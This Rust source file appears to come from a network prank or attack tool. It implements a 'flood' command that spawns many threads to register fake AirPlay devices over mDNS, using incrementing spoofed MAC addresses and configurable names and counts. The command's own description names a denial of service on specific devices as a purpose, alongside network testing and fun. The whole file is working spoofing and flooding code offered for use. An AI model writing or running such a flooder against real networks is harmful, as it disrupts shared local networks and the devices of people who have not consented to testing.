use mdns_sd::{ServiceDaemon, ServiceInfo};
use std::collections::HashMap;
use std::thread;
use std::time::Duration;

use local_ip_address::local_ip;

use super::register_airplay_device;
use crate::{utils, Command, CommandResult};

pub fn airplay_device_flood(name: &str, amount: usize) -> Result<CommandResult, CommandResult> {
    let mut threads = Vec::with_capacity(amount);
    let mut mac = utils::MacAddr::new_zeroed();
    let name = name.to_string();
    let local_ip = local_ip().map_err(|e| CommandResult::Failure {
        message: format!("local machine ip address could not be determined: {}", e),
    })?;

    //println!("{}", local_ip);
    //println!("{}", mac.as_string());
    for i in 0..amount {
        mac.increment();
        let mac_c = mac.clone();
        let name_c = name.clone();
        let t = thread::spawn(move || {
            let _ = register_airplay_device(
                &format!("{}{}", name_c, i),
                &mac_c,
                &format!("{}", local_ip,),
                8000,
            );
        });
        threads.push(t);
    }

    for t in threads {
        if let Err(_) = t.join() {
            eprintln!("An AirPlay thread failed to join...");
        }
    }

    Ok(CommandResult::Success {
        message: "job killed".to_owned(),
    })
}

pub struct AirplayFlood;
impl Command for AirplayFlood {
    fn name(&self) -> &str {
        "flood"
    }

    fn info(&self) -> &str {
        "Used to create a large amount of fake AirPlay devices for several\
         different purposes, namely a DoS on specific devices, network testing,\
          and fun"
    }

    fn run(&self, input: &str) -> Result<CommandResult, CommandResult> {
        let mut args = input.split_whitespace();
        let mut amount: usize = 10;
        let mut name: String = String::from("airplay");

        // Should write something that does this whole process by itself that
        // can be queried for flags, kinda like nushell
        while let Some(curr) = args.next() {
            match curr {
                "-a" | "--amount" => {
                    if let Some(a) = args.next() {
                        amount = a.parse().map_err(|e| CommandResult::Failure {
                            message: format!("amount unable to be parsed: {}", e),
                        })?;
                    } else {
                        return Err(CommandResult::Failure {
                            message: "amount flag used but no amount specified".to_owned(),
                        });
                    }
                }

                "-n" | "--name" => {
                    if let Some(n) = args.next() {
                        name = n.to_owned();
                    } else {
                        return Err(CommandResult::Failure {
                            message: "name flag used but no name specified".to_owned(),
                        });
                    }
                }

                &_ => {
                    return Err(CommandResult::Failure {
                        message: "unrecognized flag used".to_owned(),
                    })
                }
            }
        }

        let job = thread::spawn(move || {
            airplay_device_flood(&name, amount);
        });

        Ok(CommandResult::Success {
            message: "AirPlay flood started!".to_owned(),
        })
    }
}
